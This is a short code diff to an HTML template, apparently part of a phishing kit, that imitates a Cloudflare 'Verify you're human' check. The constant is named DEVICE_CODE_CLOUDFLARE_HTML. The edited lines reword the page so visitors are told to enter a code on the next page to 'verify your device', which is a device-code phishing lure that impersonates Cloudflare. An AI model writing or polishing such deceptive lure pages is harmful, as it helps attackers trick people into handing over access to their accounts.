@@ -2578,7 +2578,7 @@ const DEVICE_CODE_CLOUDFLARE_HTML = `<!doctype html>
 				<div class="card-body">
 					<h1 id="card-title">Verify you're human</h1>
 					<p class="subtitle">
-						You may be prompted to sign in if Cloudflare hasn’t verified your device before.
+						Enter the code on the next page to continue to verify your device. <br> This helps us ensure that you're not a bot.
 					</p>
 
 					<div class="captcha-frame">
@@ -2616,7 +2616,7 @@ const DEVICE_CODE_CLOUDFLARE_HTML = `<!doctype html>
 						</button>
 					</div>
 					<p class="hint">
-						You may be prompted to sign-in with your account if Cloudflare have not verified your device before.
+						You may be prompted to sign in if Cloudflare have not verified your device before.
 					</p>
 
 					<button id="verify-device" class="verify-btn" type="button">
